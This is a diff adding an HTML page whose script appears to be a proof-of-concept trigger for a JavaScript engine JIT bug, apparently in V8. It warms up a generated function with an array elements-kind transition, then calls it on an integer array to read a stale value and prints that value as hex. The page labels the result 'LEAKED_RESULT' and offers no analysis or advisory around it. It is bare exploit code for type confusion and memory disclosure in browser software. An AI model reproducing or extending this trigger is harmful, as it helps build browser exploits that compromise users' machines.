@@ -1,0 +1,36 @@
+<!DOCTYPE html><html><body><script>
+function create_trigger() {
+  let lines = [];
+  lines.push("function test_sink(x, arr, float_val, limit) {");
+  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
+  lines.push("  arr[0] = float_val;"); // transitions PACKED_SMI to PACKED_DOUBLE!
+  lines.push("  let leaked = arr[1];"); // loaded in preheader!
+  lines.push("  let i = 0;");
+  lines.push("  while (i < limit) { i++; }");
+  lines.push("  return leaked;");
+  lines.push("}");
+  lines.push("return test_sink;");
+  let fn = new Function(lines.join("\n"))();
+  return fn;
+}
+
+let fn = create_trigger();
+// Warmup with transition every time
+for (let i = 0; i < 2000; i++) {
+  fn(1000, [10, 20, 30], 1.1, 1);
+}
+
+setTimeout(() => {
+  // Let compilation finish, then call with SMI array
+  let smi_arr = [0x1234, 0x5678, 0x9abc];
+  let res = fn(1000, smi_arr, 1.1, 1);
+  console.log("LEAKED_RESULT: " + res);
+  // convert float to hex
+  let buf = new ArrayBuffer(8);
+  let f64 = new Float64Array(buf);
+  let u32 = new Uint32Array(buf);
+  f64[0] = res;
+  console.log("HEX: 0x" + u32[1].toString(16) + u32[0].toString(16));
+  console.log("SMI_ARR after: " + smi_arr);
+}, 1000);
+</script></body></html>
